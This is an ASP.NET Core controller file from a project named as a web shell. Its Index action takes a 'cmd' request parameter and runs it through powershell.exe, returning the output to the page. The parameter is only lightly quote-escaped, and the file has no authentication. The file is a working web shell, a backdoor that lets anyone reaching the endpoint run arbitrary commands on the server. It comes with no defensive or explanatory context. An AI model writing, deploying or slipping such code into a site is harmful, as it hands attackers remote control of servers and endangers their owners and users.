﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.Rendering;
using Microsoft.EntityFrameworkCore;
using web_shell_dotnetcore;
using web_shell_dotnetcore.Models;

namespace web_shell_dotnetcore.Controllers
{
    public class PowerShellCMsController : Controller
    {
        private readonly AppContext _context;

        public PowerShellCMsController(AppContext context)
        {
            _context = context;
        }

        // GET: PowerShellCMs
        public async Task<IActionResult> Index(string cmd)
        {
            string result = "", error = "";
            var escapedArgs = cmd.Replace("\"", "\\\"");
            var process = new Process()
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-c \"{escapedArgs}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                }
            };
            await Task.Run(() =>
            {
                process.Start();
                result = process.StandardOutput.ReadToEnd();
                error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                ViewBag.res = error == "" ? result : error;
            });

            return View();
        }

        

        private bool PowerShellCMExists(int id)
        {
            return _context.PSCommands.Any(e => e.Id == id);
        }
    }
}